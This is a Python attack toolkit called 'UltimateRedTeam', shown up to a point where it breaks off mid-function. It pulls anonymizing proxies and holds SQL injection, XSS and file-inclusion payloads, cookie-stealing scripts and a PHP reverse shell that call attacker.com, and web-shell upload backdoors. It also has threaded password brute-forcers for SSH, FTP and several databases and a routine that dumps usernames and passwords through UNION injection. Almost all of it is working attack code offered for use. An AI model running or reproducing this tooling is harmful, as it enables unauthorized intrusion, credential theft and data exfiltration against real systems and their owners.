#!/usr/bin/env python3
import socket
import requests
import threading
import time
import random
import sys
import os
import json
import hashlib
import base64
import re
import dns.resolver
import whois
import subprocess
import ipaddress
import ssl
import urllib3
import sqlite3
import shutil
import zipfile
import ftplib
import paramiko
import smtplib
import telnetlib
import poplib
import imaplib
import ldap3
import mysql.connector
import psycopg2
import pymongo
import redis
import elasticsearch
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system('clear' if os.name == 'posix' else 'cls')
print("""
\033[91m
██████╗ ███████╗██████╗ ████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ██████╔╝   ██║   █████╗  ██████╔╝
██╔══██╗██╔══╝  ██╔══██╗   ██║   ██╔══╝  ██╔══██╗
██║  ██║███████╗██║  ██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
\033[0m
""")

class UltimateRedTeam:
    def __init__(self):
        self.proxies = []
        self.results = {}
        self.threads = 300
        self.timeout = 5
        self.load_proxies()
        self.payloads = self.load_payloads()
        self.wordlist = self.load_wordlist()
        self.password_list = self.load_passwords()
        self.username_list = self.load_usernames()
        self.cve_db = self.load_cve()
        self.exploit_db = self.load_exploits()
        self.vuln_chain = []

    def load_proxies(self):
        try:
            for url in [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
            ]:
                r = requests.get(url, timeout=5)
                for line in r.text.splitlines():
                    if ':' in line:
                        self.proxies.append(line.strip())
        except:
            pass
        print(f'[+] Proxies: {len(self.proxies)}')

    def load_wordlist(self):
        return [
            'admin','root','user','test','guest','superuser','administrator',
            'password','123456','12345','1234','123','qwerty','abc123','letmein',
            'monkey','dragon','master','shadow','baseball','football','hockey',
            'soccer','starwars','batman','superman','iloveyou','fuckyou','666',
            '777','888','999','000','111','222','333','444','555','pass','pass123',
            'admin123','root123','toor','toor123','oracle','mssql','mysql','postgres',
            'mongodb','redis','elastic','kibana','logstash','grafana','prometheus',
            'jenkins','gitlab','github','bitbucket','jira','confluence','sonar','nexus',
            'artifactory','docker','k8s','openshift','rancher','portainer','cpanel',
            'webmin','plesk','vesta','ajenti','froxlor','ispconfig','virtualmin',
            'zpanel','sentora','kloxo','webuzo','interworx','directadmin','enhance'
        ]

    def load_passwords(self):
        return [
            'password','123456','12345678','1234','qwerty','abc123','monkey','dragon',
            'letmein','master','baseball','football','hockey','soccer','starwars',
            'batman','superman','iloveyou','fuckyou','admin','root','toor','oracle',
            'mssql','mysql','postgres','mongodb','redis','elastic','kibana','logstash',
            'grafana','prometheus','jenkins','gitlab','github','bitbucket','jira',
            'confluence','sonar','nexus','artifactory','docker','k8s','openshift',
            'rancher','portainer','cpanel','webmin','plesk','vesta','ajenti','froxlor',
            'ispconfig','virtualmin','zpanel','sentora','kloxo','webuzo','interworx',
            'directadmin','enhance','admin123','root123','password123','123456789',
            '1234567890','qwerty123','abc123456','letmein123','master123','dragon123'
        ]

    def load_usernames(self):
        return [
            'admin','root','user','test','guest','superuser','administrator',
            'oracle','mssql','mysql','postgres','mongodb','redis','elastic','kibana',
            'logstash','grafana','prometheus','jenkins','gitlab','github','bitbucket',
            'jira','confluence','sonar','nexus','artifactory','docker','k8s','openshift',
            'rancher','portainer','cpanel','webmin','plesk','vesta','ajenti','froxlor',
            'ispconfig','virtualmin','zpanel','sentora','kloxo','webuzo','interworx',
            'directadmin','enhance','manager','supervisor','operator','sysadmin','webadmin'
        ]

    def load_payloads(self):
        return {
            'sqli': [
                "' OR '1'='1' --","' OR '1'='1'#","' OR 1=1 --","' OR 1=1#",
                "' UNION SELECT NULL --","' AND 1=1 --","' AND 1=2 --",
                "' OR SLEEP(5) --","'; EXEC xp_cmdshell('dir') --",
                "' UNION SELECT @@version --","' UNION SELECT user() --",
                "' UNION SELECT database() --","' OR 'x'='x' --","' OR 'a'='a' --",
                "' UNION SELECT NULL,NULL,NULL --","' UNION SELECT NULL,NULL,NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
                "' OR BENCHMARK(1000000,MD5('a')) --","' OR pg_sleep(5) --",
                "' OR WAITFOR DELAY '0:0:5' --","' OR 1=1; --","' OR 1=1; #",
                "' OR 1=1; /*","' OR 1=1; -- -","' OR 1=1; #","' OR 1=1; /*",
                "' OR '1'='1' AND '1'='1' --","' OR '1'='1' AND '1'='2' --",
                "' OR '1'='2' AND '1'='1' --","' UNION SELECT * FROM users --"
            ],
            'xss': [
                "<script>alert(1)</script>","<img src=x onerror=alert(1)>",
                "javascript:alert(1)","<svg/onload=alert(1)>",
                "\"><script>alert(1)</script>","<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>","<div onmouseover=alert(1)>",
                "<input onfocus=alert(1)>","<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>","<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>","<embed src=x onerror=alert(1)>",
                "<object data=x onerror=alert(1)>","<a href=javascript:alert(1)>",
                "<form onsubmit=alert(1)>","<button onclick=alert(1)>",
                "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
                "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
                "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"
            ],
            'lfi': [
                '../../../etc/passwd','../../../../etc/passwd',
                '../../../windows/win.ini','../../../../windows/win.ini',
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/convert.base64-encode/resource=config.php',
                'php://filter/convert.base64-encode/resource=wp-config.php',
                'php://filter/convert.base64-encode/resource=db.php',
                'php://filter/convert.base64-encode/resource=settings.php',
                '../../../../boot.ini','../../../../windows/system32/drivers/etc/hosts',
                'file:///etc/passwd','file:///var/log/apache2/access.log',
                'file:///var/log/nginx/access.log','/etc/shadow','/etc/sudoers'
            ],
            'rce': [
                '<?php system($_GET["cmd"]); ?>',
                '<?php eval($_POST["cmd"]); ?>',
                '<?= system($_GET["cmd"]); ?>',
                '<?php exec($_GET["cmd"]); ?>',
                '<?php shell_exec($_GET["cmd"]); ?>',
                '<?php passthru($_GET["cmd"]); ?>',
                '<?php $sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                '<% Response.Write(Eval(Request("cmd"))) %>',
                '<% eval request("cmd") %>',
                '<?php file_put_contents("shell.php", "<?php system($_GET[cmd]); ?>"); ?>',
                '<?php system($_GET["cmd"]); ?> //',
                '<?php system($_GET["cmd"]); ?>#',
                '<?php system($_GET["cmd"]); ?>/*',
                '<?php echo system($_GET["cmd"]); ?>'
            ],
            'upload': [
                '<?php system($_GET["cmd"]); ?>',
                'GIF89a; <?php system($_GET["cmd"]); ?>',
                '<?php eval($_POST["cmd"]); ?>',
                '<?php file_put_contents("backdoor.php","<?php system($_GET[cmd]); ?>"); ?>',
                '<?php $cmd = $_GET["cmd"]; system($cmd); ?>',
                '<?php passthru($_GET["cmd"]); ?>'
            ]
        }

    def load_cve(self):
        return {
            'CVE-2024-4671': 'Chrome V8 RCE',
            'CVE-2024-38063': 'Windows TCP/IP RCE',
            'CVE-2024-6387': 'OpenSSH RCE (regreSSHion)',
            'CVE-2024-26169': 'Windows Error Reporting LPE',
            'CVE-2024-21307': 'Windows Kerberos LPE',
            'CVE-2024-21410': 'Exchange Server RCE',
            'CVE-2024-21887': 'Ivanti Connect Secure RCE',
            'CVE-2024-21413': 'Microsoft Outlook RCE',
            'CVE-2024-30078': 'Windows Wi-Fi RCE',
            'CVE-2024-30103': 'Microsoft SharePoint RCE',
            'CVE-2024-30080': 'Windows Kernel LPE',
            'CVE-2024-26234': 'Windows DNS RCE',
            'CVE-2024-21412': 'Windows SmartScreen Bypass',
            'CVE-2024-20683': 'Win32k LPE',
            'CVE-2024-21308': 'Windows TCP/IP RCE',
            'CVE-2024-21405': 'Windows MSHTML RCE',
            'CVE-2024-20666': 'Windows Netlogon LPE',
            'CVE-2024-21311': 'Windows RDP RCE',
            'CVE-2024-21407': 'Windows DHCP RCE',
            'CVE-2024-21309': 'Windows SSL RCE'
        }

    def load_exploits(self):
        return {
            'wordpress': [
                'wp-admin/xmlrpc.php?rsd=1',
                'wp-content/uploads/',
                'wp-includes/',
                'wp-config.php.bak',
                'wp-config.php~',
                '.htaccess',
                'wp-admin/admin-ajax.php'
            ],
            'joomla': [
                'administrator/',
                'components/',
                'modules/',
                'plugins/',
                'configuration.php',
                'configuration.php.bak',
                '.htaccess'
            ],
            'drupal': [
                'sites/default/',
                'sites/default/settings.php',
                'sites/default/files/',
                'modules/',
                'themes/',
                'profiles/'
            ],
            'laravel': [
                '.env',
                '.env.example',
                'storage/',
                'bootstrap/cache/',
                'vendor/',
                'config/',
                'database/',
                'resources/',
                'routes/',
                'public/'
            ]
        }

    def get_proxy(self):
        return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)} if self.proxies else None

    def ssh_bruteforce(self, host, port=22):
        print(f'\n[+] SSH Bruteforce: {host}:{port}')
        found = []
        def try_login(user, passwd):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port, user, passwd, timeout=3)
                client.close()
                print(f'  [+] {user}:{passwd}')
                found.append((user, passwd))
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for user in self.username_list[:10]:
                for passwd in self.password_list[:10]:
                    ex.submit(try_login, user, passwd)
        return found

    def ftp_bruteforce(self, host, port=21):
        print(f'\n[+] FTP Bruteforce: {host}:{port}')
        found = []
        def try_login(user, passwd):
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user, passwd)
                ftp.quit()
                print(f'  [+] {user}:{passwd}')
                found.append((user, passwd))
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for user in self.username_list[:10]:
                for passwd in self.password_list[:10]:
                    ex.submit(try_login, user, passwd)
        return found

    def mysql_bruteforce(self, host, port=3306):
        print(f'\n[+] MySQL Bruteforce: {host}:{port}')
        found = []
        def try_login(user, passwd):
            try:
                conn = mysql.connector.connect(host=host, port=port, user=user, password=passwd, timeout=3)
                conn.close()
                print(f'  [+] {user}:{passwd}')
                found.append((user, passwd))
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for user in self.username_list[:10]:
                for passwd in self.password_list[:10]:
                    ex.submit(try_login, user, passwd)
        return found

    def postgres_bruteforce(self, host, port=5432):
        print(f'\n[+] PostgreSQL Bruteforce: {host}:{port}')
        found = []
        def try_login(user, passwd):
            try:
                conn = psycopg2.connect(host=host, port=port, user=user, password=passwd, timeout=3)
                conn.close()
                print(f'  [+] {user}:{passwd}')
                found.append((user, passwd))
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for user in self.username_list[:10]:
                for passwd in self.password_list[:10]:
                    ex.submit(try_login, user, passwd)
        return found

    def mongodb_bruteforce(self, host, port=27017):
        print(f'\n[+] MongoDB Bruteforce: {host}:{port}')
        found = []
        def try_login(user, passwd):
            try:
                client = pymongo.MongoClient(f'mongodb://{user}:{passwd}@{host}:{port}/', serverSelectionTimeoutMS=3000)
                client.admin.command('ping')
                client.close()
                print(f'  [+] {user}:{passwd}')
                found.append((user, passwd))
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for user in self.username_list[:10]:
                for passwd in self.password_list[:10]:
                    ex.submit(try_login, user, passwd)
        return found

    def redis_bruteforce(self, host, port=6379):
        print(f'\n[+] Redis Bruteforce: {host}:{port}')
        found = []
        def try_login(passwd):
            try:
                r = redis.Redis(host=host, port=port, password=passwd, socket_timeout=3)
                r.ping()
                print(f'  [+] password: {passwd}')
                found.append(passwd)
            except:
                pass
        with ThreadPoolExecutor(max_workers=50) as ex:
            for passwd in self.password_list[:10]:
                ex.submit(try_login, passwd)
        return found

    def wordpress_exploit(self, url):
        print(f'\n[+] WordPress Exploit: {url}')
        found = []
        for path in self.load_exploits()['wordpress']:
            test = f"{url.rstrip('/')}/{path}"
            try:
                r = requests.get(test, timeout=3, proxies=self.get_proxy())
                if r.status_code == 200:
                    found.append(test)
                    print(f'  [+] {test}')
            except:
                pass
        return found

    def joomla_exploit(self, url):
        print(f'\n[+] Joomla Exploit: {url}')
        found = []
        for path in self.load_exploits()['joomla']:
            test = f"{url.rstrip('/')}/{path}"
            try:
                r = requests.get(test, timeout=3, proxies=self.get_proxy())
                if r.status_code == 200:
                    found.append(test)
                    print(f'  [+] {test}')
            except:
                pass
        return found

    def drupal_exploit(self, url):
        print(f'\n[+] Drupal Exploit: {url}')
        found = []
        for path in self.load_exploits()['drupal']:
            test = f"{url.rstrip('/')}/{path}"
            try:
                r = requests.get(test, timeout=3, proxies=self.get_proxy())
                if r.status_code == 200:
                    found.append(test)
                    print(f'  [+] {test}')
            except:
                pass
        return found

    def laravel_exploit(self, url):
        print(f'\n[+] Laravel Exploit: {url}')
        found = []
        for path in self.load_exploits()['laravel']:
            test = f"{url.rstrip('/')}/{path}"
            try:
                r = requests.get(test, timeout=3, proxies=self.get_proxy())
                if r.status_code == 200:
                    found.append(test)
                    print(f'  [+] {test}')
            except:
                pass
        return found

    def exploit_sqli_dump(self, url, param, payload):
        print(f'\n[+] SQLi Dump: {param}')
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query) if parsed.query else {}
        data = {}

        for i in range(1, 11):
            qs[param] = [f"' UNION SELECT {','.join(['NULL']*i)} --"]
            test_url = f"{base}?{urlencode(qs, doseq=True)}"
            try:
                r = requests.get(test_url, timeout=3, proxies=self.get_proxy())
                if r.status_code == 200:
                    print(f'  [+] {i} columns')
            except:
                pass

        qs[param] = ["' UNION SELECT database(),user(),version() --"]
        test_url = f"{base}?{urlencode(qs, doseq=True)}"
        try:
            r = requests.get(test_url, timeout=3, proxies=self.get_proxy())
            if r.status_code == 200:
                data['database'] = r.text[:200]
                print(f'  [+] DB: {data["database"]}')
        except:
            pass

        qs[param] = ["' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --"]
        test_url = f"{base}?{urlencode(qs, doseq=True)}"
        try:
            r = requests.get(test_url, timeout=3, proxies=self.get_proxy())
            if r.status_code == 200:
                tables = re.findall(r'([a-zA-Z0-9_]+)', r.text)
                data['tables'] = tables[:15]
                print(f'  [+] Tables: {", ".join(tables[:15])}')
        except:
            pass

        qs[param] = ["' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --"]
        test_url = f"{base}?{urlencode(qs, doseq=True)}"
        try:
            r = requests.get(test_url, timeout=3, proxies=self.get_proxy())
            if r.status_code == 200:
                cols = re.findall(r'([a-zA-Z0-9_]+)', r.text)
                data['columns'] = cols[:10]
                print(f'  [+] Columns: {", ".join(cols[:10])}')
        except:
            pass

        qs[param] = ["' UNION SELECT username,password,NULL FROM users --"]
        test_url = f"{base}?{urlencode(qs, doseq=True)}"
        try:
            r = requests.get(test_url, timeout=3, proxies=self.get_proxy())
            if r.status_code == 200:
            
